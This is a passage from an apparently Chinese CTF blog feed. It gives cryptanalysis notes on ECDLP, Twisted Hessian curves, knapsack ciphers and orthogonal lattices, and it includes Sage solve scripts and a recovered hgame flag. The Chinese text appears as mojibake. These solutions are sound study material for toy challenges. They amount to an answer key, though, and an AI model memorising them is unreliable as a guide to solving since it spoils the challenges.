class="hljs-number">2618594245402239609420638325588710628729298505557767536783081437084561636188823448848608313088279895767614513680617644960939796227640357345879653043764575378231433481016175403223796690453962090038403036583909367766156025584252164203</span>, <span class="hljs-number">16129071855649587728956130797915283397821444682369014639788931828703405001025452386772618008541361124591860437269977673096643234091339097919538256670714042876788038021148787313041232229195101391115617710413115586617903468179658293636</span>, <span class="hljs-number">9296460193370583816070265591004199836116409032475859821958373154648206416256688852532615798871909770401306092671009539709487113538354105710364096048695663733075506988691991440779198012260316123759636997605427235081435477049705160552</span>, <span class="hljs-number">1356766159480311231046092117641588893355352105595481615726950290176811339998878309107970938869998059989877968402614403581962019949583734460209881480875822282448127936842922015950977040552638984243226561237288675211033594559512352433</span>, <span class="hljs-number">19197695297715405687227248527900901092786200526800375602428770624109373871809940359427277921210632597272639018938714964263079621574904896862536158251668755864087715415463131002786745060027810126535070270462254705453473599741763642828</span>, <span class="hljs-number">11504919294119244522634617029097854228866432223952020614427505589799731544252763714133524362716131837287869956783968056158486948361614604723869397483955281379172665969413312233383788159684735115665749332738234882920695449340309379522</span>, <span class="hljs-number">18136748881313347797489256490303008973958797121502583070872297973410283357173931060145003395290313809639159364452878423212404968100529416632370960280991488248897643385077173546644657216962479904853980225967792378564740955618790869689</span>, <span class="hljs-number">22555443333166977522691347301347007560400051480503434282172981846969595435546624498334336147388425749569732805395419970503066627849315134643618856767862223712319227590572187001545137380352712433069385477809940371396279834624165048444</span>, <span class="hljs-number">19332410102472644041731759226399070707013106727087481077728390364392367890410961009071561108596168685943298518353047413086954964804844094391018967334543408778135737715163542892702469367908397906585577557910294555212057020330243744038</span>, <span class="hljs-number">17177417284468945229490862308619539417109492506914913062877431832846296734201442477935598961820079857431068892933310664489209467455843404117024994948398426037991145460135427180175565761835499766689618253941365562391662494080561342044</span>, <span class="hljs-number">879611534766674063001632328710680301710464497091520920338941691285492779988149399177086528073474651179894297281827841186309099576047175634809922453338033325127493237666384356566986210156156953604218009901589731044248652021118031620</span>, <span class="hljs-number">23901207038202622707599557245612794049853792927287360450027492049407851837113641371314557090659548570609882944974639719117613653182109642059819516444307658547936689472901123537159776992389462316392381501838566991389570490374017025518</span>, <span class="hljs-number">7294655103119575652652322286451546582028529239995283561722077129773315845389577738996103704019032108880990669128684769525902413906863125164280686381766699292160785541839733876768365575818004233647829515890263347139003166333882303265</span>, <span class="hljs-number">8199949148068603717078157517861527127346508355755818050198576663971835822831527608360661637977726638149791394376076411543777469889828576151097728735193348069053034445800818498132875303434000618724830859612380606691308333135184789022</span>, <span class="hljs-number">12932127055873709636118977200718753643697619875736929170699115793566554057840448101626698069421491300195262169693063575726920790612681778762496689371363586507749098405216335541209813518577176560833970043581650697105699549343835699165</span>, <span class="hljs-number">9917293893368177421397475427602509319278773672321383411846980082270699518174858223780569843589979834443168760567064326549648560205061679870738748816216468066517782541276129041173215780179108422815701857032247139868407259633376154559</span>, <span class="hljs-number">6485828831888305306081814677813540588127941945945034779245913009780868830245510314875533356179894354966906340154886875373143060627077170845158967404313883218225671724777853809740370308868692781589580666606866945869996719967294318732</span>, <span class="hljs-number">19119951246631217104039346142695133667127595492295413599863780403588391811741379549048868909966290463800864082020118315313386877862668618823502190910178365164478013264098319748585627290011516370646420391829298524728641913535537536764</span>, <span class="hljs-number">13215772369693604102761934975932281069170694713655356522695565074039936506383846119163879883348265869353744569056003177315023138985010016601208933546975222998897707503967398686672700803569601825514347043442257463097499547507964305449</span>, <span class="hljs-number">1824804736849693701490461807874708098331129810367417218087931080176315035870555627969047286436604549231593492189121553958901210913466534815129733115561941853007429568739121822292088591127010504328963864942012956577043433126898293277</span>, <span class="hljs-number">6776240363305734174388141780584391816477723528084755437932934198907331150157541368203589425111306785868566064140117304971940704620271781717831300158164114203169466745769627304177491937036545708540956189334174616021603617610568750468</span>)        <span class="hljs-comment">#ç»™å®šæœ€ç»ˆå‘é‡</span><br><br>Lx, va = Nguyen_Stern(h, m, n, M)<br><br>ans=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Lx:<br>    ans.append(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,i)),<span class="hljs-number">2</span>)))<br><br><span class="hljs-comment">#print(&quot;å‘é‡a:&quot;,va)</span><br><span class="hljs-comment">#print(&quot;çŸ©é˜µx:&quot;,Lx)</span><br><span class="hljs-built_in">print</span>(ans[-<span class="hljs-number">1</span>])<br><span class="hljs-comment">#b&#x27;hgame&#123;U_f0und_3he_5pec14l_0n3!&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cryptoéšç¬”æ‰«ç›²</title>
    <link href="/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/"/>
    <url>/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="ECDLPï¼ˆæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼‰"><a href="#ECDLPï¼ˆæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼‰" class="headerlink" title="ECDLPï¼ˆæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼‰"></a>ECDLPï¼ˆæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼‰</h2><p> <strong>æ¦‚å¿µï¼š</strong> ç»™å®šç´ æ•°Â pÂ å’Œæ¤­åœ†æ›²çº¿Â Eï¼Œå¯¹äºÂ Q&#x3D;k*Pï¼Œåœ¨å·²çŸ¥Â P,QÂ çš„æƒ…å†µä¸‹æ±‚å‡ºå°äºÂ pÂ çš„æ­£æ•´æ•°Â kã€‚å¯ä»¥è¯æ˜ç”±Â kÂ å’ŒÂ PÂ è®¡ç®—Â QÂ æ¯”è¾ƒå®¹æ˜“ï¼Œè€Œç”±Â QÂ å’ŒÂ PÂ è®¡ç®—Â kÂ åˆ™æ¯”è¾ƒå›°éš¾ã€‚</p><p> <strong>æ–¹æ³•ï¼šï¼ˆç±»ä¼¼DLé—®é¢˜ï¼‰</strong></p><ul><li><p><strong>æš´åŠ›æœç´¢ï¼ˆBrute Forceï¼‰</strong>ï¼šé€‚ç”¨äºå°è§„æ¨¡ï¼Œkæ¯”è¾ƒå°</p></li><li><p><strong>Pollardâ€™s Rho ç®—æ³•</strong>ï¼šé€‚ç”¨äºç¾¤çš„é˜¶è¾ƒå¤§ã€‚è¿™æ˜¯ä¸€ç§æ¦‚ç‡æ€§ç®—æ³•ï¼ŒåŸºäºéšæœºæ¸¸èµ°å’Œç”Ÿæ—¥æ‚–è®ºï¼Œå¤æ‚åº¦ä¸º$O(\sqrt{n})$ï¼Œå…¶ä¸­ n æ˜¯ç¾¤çš„é˜¶ã€‚ç»“åˆä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰ç»„åˆç»“æœã€‚</p></li><li><p><strong>Pohlig-Hellman ç®—æ³•</strong>ï¼šé€‚ç”¨äºé˜¶å¯ä»¥åˆ†è§£ä¸ºå¤šä¸ªå°ç´ æ•°çš„å¹‚ã€‚</p></li><li><p><strong>Baby-Step Giant-Step ç®—æ³•ï¼ˆå°æ­¥å¤§æ­¥æ³•ï¼‰</strong>ï¼šé€šè¿‡é¢„è®¡ç®—å’ŒæŸ¥æ‰¾è¡¨çš„æ–¹å¼å°†é—®é¢˜åˆ†è§£ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œå¤æ‚åº¦ä¸º$O(\sqrt{n})$ï¼Œéœ€è¦è¾ƒå¤§çš„å­˜å‚¨ç©ºé—´ã€‚</p></li></ul><p> <strong>ä»£ç ï¼š</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>p = <br>a = <br>b = <br>E = EllipticCurve(GF(p),[a,b]) <span class="hljs-comment">#Weierstrassså½¢å¼ï¼ˆæ¤­åœ†æ›²çº¿æ ‡å‡†å½¢å¼ï¼‰</span><br>P = E(, ) <br>Q = E(, ) <br>k = discrete_log(Q, P, operation=<span class="hljs-string">&#x27;+&#x27;</span>) <br><span class="hljs-comment">#æˆ– discrete_log_rho(a,base,ord,operation)</span><br><span class="hljs-comment">#æˆ– bsgs(base,a,bounds,operation)</span><br><span class="hljs-comment">#æˆ– k = Q.log(P)</span><br><br><span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h1 id="THæ›²çº¿-Twisted-Hessian-Curves"><a href="#THæ›²çº¿-Twisted-Hessian-Curves" class="headerlink" title="THæ›²çº¿ (Twisted Hessian Curves)"></a>THæ›²çº¿ (Twisted Hessian Curves)</h1><p> <strong>ä¸€èˆ¬æ–¹ç¨‹ï¼š</strong></p><p> $ax^3+y^3+1&#x3D;dxy$</p><p> <strong>åŠ æ³•ï¼š</strong></p> <span> $$ (x_1,y_1)+(x_2,y_2)=(\frac{x_1-y_1^2x_2y_2}{ax_1y_1x_2^2-y_2},\frac{y_1y_2^2-ax_1^2x_2}{ax_1y_1^3-y_1}) $$ </span><p> <strong>å€ä¹˜ï¼š</strong></p> <span> $$ 2(x_1,y_1)=(\frac{x_1-y_1^3x_1}{ay_1x_1^3-y_1},\frac{y_1^3-ax_1^3}{ay_1x_1^3-y_1}) $$ </span>  <p> <strong>å–åï¼š</strong></p><span>  $$ -(x_1,y_1)=(\frac{x_1}{y_1},\frac{1}{y_1}) $$ </span>  <p> <strong>æ„é€ æ–¹æ³•ï¼š</strong></p><p> å°†åŸæ–¹ç¨‹è½¬åŒ–æˆ<strong>é½æ¬¡ä¸‰æ¬¡æ–¹ç¨‹</strong>ï¼Œä»¤$x&#x3D;\frac{xâ€™}{z},y&#x3D;\frac{yâ€™}{z}$ï¼Œ</p><p> åŸå¼å˜ä¸º$axâ€™^3+yâ€™^3+z^3&#x3D;dxâ€™yâ€™z$ï¼Œ</p><p> ç„¶ååˆ©ç”¨</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cubic = a*x^<span class="hljs-number">3</span> + y^<span class="hljs-number">3</span> + z^<span class="hljs-number">3</span> - d*x*y*z<br>E = EllipticCurve_from_cubic(cubic, morphism=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p> ä¾¿å¯å°†ä¸‰æ¬¡æ›²çº¿ï¼ˆcubicï¼‰è½¬æ¢ä¸ºæ¤­åœ†æ›²çº¿çš„æ ‡å‡†å½¢å¼ï¼ˆWeierstrasså½¢å¼ï¼‰çš„å‡½æ•°ã€‚</p><p> <strong>ä¾‹é¢˜ï¼š</strong></p><p> <strong>ï¼ˆHgame 2025ï¼‰Intergalactic Bound</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_THCurve</span>(<span class="hljs-params">P, Q</span>):  <span class="hljs-comment">#æ›²çº¿åŠ æ³•</span><br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    x1, y1 = P<br>    x2, y2 = Q<br>    x3 = (x1 - y1 ** <span class="hljs-number">2</span> * x2 * y2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    y3 = (y1 * y2 ** <span class="hljs-number">2</span> - a * x1 ** <span class="hljs-number">2</span> * x2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    <span class="hljs-keyword">return</span> x3, y3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_THCurve</span>(<span class="hljs-params">n, P</span>):  <span class="hljs-comment">#æ›²çº¿ä¹˜æ³•</span><br>    R = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            R = add_THCurve(R, P)<br>        P = add_THCurve(P, P)<br>        n = n // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> R<br><br><br>p = getPrime(<span class="hljs-number">96</span>)<br>a = randint(<span class="hljs-number">1</span>, p)<br>G = (randint(<span class="hljs-number">1</span>,p), randint(<span class="hljs-number">1</span>,p))<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p   <span class="hljs-comment">#d=(a * x0^3 + y0^3 + 1)modp * (x0*y0)^-1 modp </span><br>x = randint(<span class="hljs-number">1</span>, p)<br>Q = mul_THCurve(x, G)   <span class="hljs-comment">#Q=x*G</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;G = <span class="hljs-subst">&#123;G&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Q = <span class="hljs-subst">&#123;Q&#125;</span>&quot;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()  <span class="hljs-comment">#åˆ†æå¯çŸ¥ï¼Œç›®çš„å°±æ˜¯æ±‚å‡ºx</span><br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p = 55099055368053948610276786301</span><br><span class="hljs-string">G = (19663446762962927633037926740, 35074412430915656071777015320)</span><br><span class="hljs-string">Q = (26805137673536635825884330180, 26376833112609309475951186883)</span><br><span class="hljs-string">ciphertext=b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p> expï¼š</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>G = (<span class="hljs-number">19663446762962927633037926740</span>, <span class="hljs-number">35074412430915656071777015320</span>) <br>Q = (<span class="hljs-number">26805137673536635825884330180</span>, <span class="hljs-number">26376833112609309475951186883</span>)  <br>p = <span class="hljs-number">55099055368053948610276786301</span><br><br>ciphertext=<span class="hljs-string">b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span>   <span class="hljs-comment">#å¯†æ–‡</span><br><br>Gx,Gy=G     <span class="hljs-comment">#æå–Gçš„xï¼Œyåæ ‡</span><br>Qx,Qy=Q     <span class="hljs-comment">#æå–Qçš„xï¼Œyåæ ‡</span><br><br>M=matrix(GF(p),[[-Gx**<span class="hljs-number">3</span>,Gx*Gy],[-Qx**<span class="hljs-number">3</span>,Qx*Qy]]) <span class="hljs-comment">#æ„é€ 2*2çŸ©é˜µ</span><br>y=vector(GF(p),[Gy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>,Qy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>])               <span class="hljs-comment">#æ„é€ å‘é‡</span><br>a,d=M.solve_right(y)                            <span class="hljs-comment">#æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„</span><br><span class="hljs-built_in">print</span>(a,d)<br>a=<span class="hljs-built_in">int</span>(a)<br>d=<span class="hljs-built_in">int</span>(d)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 39081810733380615260725035189</span><br><span class="hljs-string">d = 8569490478014112404683314361</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>R.&lt;xx,yy,zz&gt; = Zmod(p)[]<br>cubic = a * xx^<span class="hljs-number">3</span> + yy^<span class="hljs-number">3</span> + zz^<span class="hljs-number">3</span> - d * xx * yy * zz<br>E = EllipticCurve_from_cubic(cubic, morphism=<span class="hljs-literal">True</span>)<br><br>GG = E(G)<br>QQ = E(Q)<br>k = QQ.log(GG)  <span class="hljs-comment">#æ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼ˆECDLPï¼‰</span><br><span class="hljs-comment">#k=discrete_log(QQ,GG,operation=&#x27;+&#x27;)</span><br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>key=sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>aes=AES.new(key,AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(aes.decrypt(ciphertext))<br></code></pre></td></tr></table></figure><h1 id="èƒŒåŒ…å¯†ç "><a href="#èƒŒåŒ…å¯†ç " class="headerlink" title="èƒŒåŒ…å¯†ç "></a>èƒŒåŒ…å¯†ç </h1><p> <strong>å‚è€ƒï¼š</strong></p><p> <a href="https://dexterjie.github.io/2024/07/29/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81/" title="èƒŒåŒ…å¯†ç ">https://dexterjie.github.io/2024/07/29/èƒŒåŒ…å¯†ç /</a></p><p> <a href="https://blog.kamino.link/2022/04/03/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E5%AD%A6/">èƒŒåŒ…å¯†ç å­¦ - Kaminoâ€™s Blog</a></p><p> <a href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">å…¶ä»–åŠ å¯†ç®—æ³• | Lazzaro (lazzzaro.github.io)</a></p><p> <strong>èƒŒåŒ…é—®é¢˜ï¼š</strong></p><p> å·²çŸ¥æœ‰nä¸ªç‰©ä½“ä½“ç§¯åˆ†åˆ«ä¸º${a_1,a_2,a_3,â€¦a_n}$ï¼Œè¦æ°å¥½è£…æ»¡ä¸€ä¸ªå®¹ç§¯ä¸ºSçš„èƒŒåŒ…ï¼ŒæŠ½è±¡ä¸ºæ•°å­¦å…¬å¼å°±æ˜¯</p> <span> $$ x_1a_1+x_2a_2+x_3a_3+...+x_na_n=S $$ </span> <p> å…¶ä¸­$X&#x3D;{x_1,x_2,x_3,â€¦x_n}$ ($x_i$&#x3D;0æˆ–1)</p><p> <strong>åŠ å¯†è¿‡ç¨‹ï¼š</strong> </p><ul><li><p>å–æ˜æ–‡ï¼Œè½¬æˆäºŒè¿›åˆ¶è¡¨ç¤º$X&#x3D;{x_1,x_2,x_3,â€¦x_n}$ã€‚</p></li><li><p>å–è¶…é€’å¢åºåˆ—ä½œä¸ºå¯†é’¥${a_1,a_2,a_3,â€¦a_n}$ã€‚</p></li><li><p>å–ä¸€ä¸ªå¤§äºæ¯ä¸€ä¸ªå¯†é’¥çš„æ•´æ•°Mä½œä¸ºæ¨¡æ•°ã€‚</p></li><li><p>å–ä¸€ä¸ªä¸$M$äº’è´¨çš„æ•´æ•°$B$ä½œä¸ºä¹˜æ•°ã€‚</p></li><li><p>ç”Ÿæˆå…¬é’¥åºåˆ—$A&#x3D;{A_1,A_2,A_3,â€¦A_n}$ï¼Œå…¶ä¸­$A_i&#x3D;Ba_i\mod M$</p></li><li><p>ç”Ÿæˆå¯†æ–‡</p></li></ul> <span> $$ S=\sum_{i=1}^nA_i*x_i $$ </span> <p> <strong>è§£å¯†æµç¨‹ï¼š</strong></p><ul><li><p>æ±‚ä¹˜æ•°$B$çš„å…³äºæ¨¡$M$çš„æ¨¡é€†$B^{-1}$</p></li><li><p>è®¡ç®—å¯†æ–‡</p></li></ul> <span> $$ S'=B^{-1}S\mod M=\sum_{i=1}^nx_ia_i \mod M $$ </span> <ul><li>åˆ©ç”¨è¶…é€’å¢åºåˆ—ç‰¹æ€§ï¼Œä»å¤§åˆ°å°è§£å†³èƒŒåŒ…é—®é¢˜ã€‚</li></ul> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(key):<br>    <span class="hljs-keyword">if</span> s &gt; i:<br>        m += <span class="hljs-string">&#x27;1&#x27;</span><br>        s -= i<br>    <span class="hljs-keyword">else</span>:<br>        m += <span class="hljs-string">&#x27;0&#x27;</span><br>        s -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p> <strong>è§£å¯†æ”»å‡»ï¼šï¼ˆä¸çŸ¥é“ä¹˜æ•°ï¼‰</strong></p><p> æ„é€ æ ¼ï¼š</p><span>$$ \begin{bmatrix}2 & 0 & 0 & \cdots & m_1\\0 & 2 & 0 & \cdots & m_2\\0 & 0 & 2 & \cdots & m_3\\\vdots & \vdots & \vdots & \ddots & \vdots\\1 & 1 & 1 & \cdots & S \\\end{bmatrix}$$</span> <p> åˆ©ç”¨LLLæˆ–BKZï¼Œæ —å­å¦‚ä¸‹ï¼š</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">sum</span>=<span class="hljs-number">492226042629702</span><br>nbits=<span class="hljs-number">32</span><br>M=[<span class="hljs-number">19620578458228</span>, <span class="hljs-number">39616682530092</span>, <span class="hljs-number">3004204909088</span>, <span class="hljs-number">6231457508054</span>, <span class="hljs-number">3702963666023</span>, <span class="hljs-number">48859283851499</span>, <span class="hljs-number">4385984544187</span>, <span class="hljs-number">11027662187202</span>, <span class="hljs-number">18637179189873</span>, <span class="hljs-number">29985033726663</span>, <span class="hljs-number">20689315151593</span>, <span class="hljs-number">20060155940897</span>, <span class="hljs-number">46908062454518</span>, <span class="hljs-number">8848251127828</span>, <span class="hljs-number">28637097081675</span>, <span class="hljs-number">35930247189963</span>, <span class="hljs-number">20695167327567</span>, <span class="hljs-number">36659598017280</span>, <span class="hljs-number">10923228050453</span>, <span class="hljs-number">29810039803392</span>, <span class="hljs-number">4443991557077</span>, <span class="hljs-number">31801732862419</span>, <span class="hljs-number">23368424737916</span>, <span class="hljs-number">15178683835989</span>, <span class="hljs-number">34641771567914</span>, <span class="hljs-number">44824471397533</span>, <span class="hljs-number">31243260877608</span>, <span class="hljs-number">27158599500744</span>, <span class="hljs-number">2219939459559</span>, <span class="hljs-number">20255089091807</span>, <span class="hljs-number">24667494760808</span>, <span class="hljs-number">46915118179747</span>]<br>A=Matrix(ZZ,nbits+<span class="hljs-number">1</span>,nbits+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    A[i,i]=<span class="hljs-number">2</span><br>    A[i,-<span class="hljs-number">1</span>]=M[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits+<span class="hljs-number">1</span>):<br>    A[-<span class="hljs-number">1</span>,i]=<span class="hljs-number">1</span><br>A[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">sum</span><br>r=A.LLL()<br><span class="hljs-built_in">print</span>(r[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#(-1, -1, 1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, -1, -1, 1, -1, -1, 1, 1, -1, 1, 1, 0)</span><br></code></pre></td></tr></table></figure><h1 id="æ­£äº¤æ ¼"><a href="#æ­£äº¤æ ¼" class="headerlink" title="æ­£äº¤æ ¼"></a>æ­£äº¤æ ¼</h1><p> <strong>å‚è€ƒï¼š</strong></p><p> <a href="https://0xffff.one/d/2077">HSSPä¸æ­£äº¤æ ¼å­¦ä¹ ç¬”è®° - 0xFFFF</a></p><p> <a href="https://huangx607087.online/2025/02/21/Hgame25/#6-SPiCa-8pts-21sol">Hgame25 - huangx607087â€™s Blog</a></p><p> <strong>HSSPé—®é¢˜ï¼š</strong></p><p> $A\vec{x}\equiv\vec{b}\mod p$ï¼Œå·²çŸ¥$\vec{b}$å’Œ$p$ï¼Œè€Œ$A$ï¼ˆ0,1çŸ©é˜µï¼‰å’Œ$\vec{x}$ï¼ˆå‘é‡ï¼‰æœªçŸ¥ã€‚</p><p> <strong>å››å¤§åŸºæœ¬å­ç©ºé—´ï¼š</strong></p><ul><li><p><strong>è¡Œç©ºé—´ï¼š</strong> $A\vec{x}&#x3D;\vec{b}$ä¸­ï¼Œæ‰€æœ‰$\vec{b}$æ„æˆçš„ç©ºé—´ï¼Œæ­¤æ—¶$A$çš„æ¯ä¸€è¡Œæ„æˆç©ºé—´çš„åŸºåº•å‘é‡ã€‚</p></li><li><p><strong>åˆ—ç©ºé—´ï¼š</strong> $A\vec{x}&#x3D;\vec{b}$ä¸­ï¼Œæ‰€æœ‰$\vec{b}$æ„æˆçš„ç©ºé—´ï¼Œæ­¤æ—¶$A$çš„æ¯ä¸€åˆ—æ„æˆç©ºé—´çš„åŸºåº•å‘é‡ã€‚</p></li><li><p><strong>å·¦0ç©ºé—´ï¼š</strong> æ»¡è¶³$\vec{x}A&#x3D;\vec{0}$çš„æ‰€æœ‰$\vec{x}$æ„æˆçš„é›†åˆï¼Œåœ¨sagemathä¸­ä¸ºÂ <code>A.left_kernel().matrix()</code>ã€‚å…¶ä¸ªæ•°ä¸º$m-r+1$ï¼Œ$r$ä¸º$A$ä¸­äº’ç›¸çº¿æ€§æ— 